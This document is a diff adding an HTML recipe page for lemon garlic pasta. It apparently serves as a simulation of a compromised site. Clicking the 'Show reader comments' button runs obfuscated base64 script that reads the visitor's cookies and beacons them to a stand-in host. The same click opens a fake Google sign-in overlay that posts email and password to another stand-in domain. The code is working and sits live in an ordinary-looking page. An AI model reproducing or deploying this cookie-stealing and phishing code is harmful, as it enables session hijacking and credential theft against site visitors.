@@ -1,0 +1,25 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Lemon Garlic Pasta | Sunday Supper</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{font:17px Georgia,serif;max-width:680px;margin:40px auto;padding:0 16px;color:#222}h1{font-size:34px}button{font:15px system-ui;padding:8px 14px}</style></head>
+<body><h1>Lemon Garlic Pasta</h1><p><em>Serves 4 &middot; 25 minutes</em></p>
+<p>Boil 400 g spaghetti in well-salted water. Meanwhile, warm olive oil with four sliced garlic cloves until fragrant,
+then add the zest and juice of two lemons. Toss with the pasta, a ladle of cooking water and plenty of parmesan.</p>
+<h2>Ingredients</h2><ul><li>400 g spaghetti</li><li>4 garlic cloves</li><li>2 lemons</li><li>60 g parmesan</li><li>Olive oil, salt, pepper</li></ul>
+<button id="more">Show reader comments</button><div id="comments"></div>
+<script>
+// Simulates the site being compromised: the button loads "comments", which
+// inject an obfuscated script and a fake sign-in overlay posting elsewhere.
+document.getElementById("more").onclick = function () {
+  var s = document.createElement("script");
+  s.textContent = 'var _0x4f=["ZG9jdW1lbnQuY29va2ll","aHR0cDovL3N0YXRzLWNkbi5leGFtcGxlL2M="];' +
+    'var _0x1a=eval(atob(_0x4f[0]));new Image().src=atob(_0x4f[1])+"?c="+encodeURIComponent(_0x1a);';
+  document.body.appendChild(s);
+  var o = document.createElement("div");
+  o.innerHTML = '<div style="position:fixed;inset:0;background:#0008;display:flex;align-items:center;justify-content:center">' +
+    '<form method="post" action="https://account-verify.example/login" style="background:#fff;padding:28px;border-radius:10px;width:320px;font:15px system-ui">' +
+    '<h3 style="margin-top:0">Your session expired</h3><p>Sign in with Google to keep reading.</p>' +
+    '<label>Email<br><input name="email" style="width:100%"></label><br><br>' +
+    '<label>Password<br><input name="pw" type="password" style="width:100%"></label><br><br><button>Continue</button></form></div>';
+  document.body.appendChild(o);
+};
+</script></body></html>
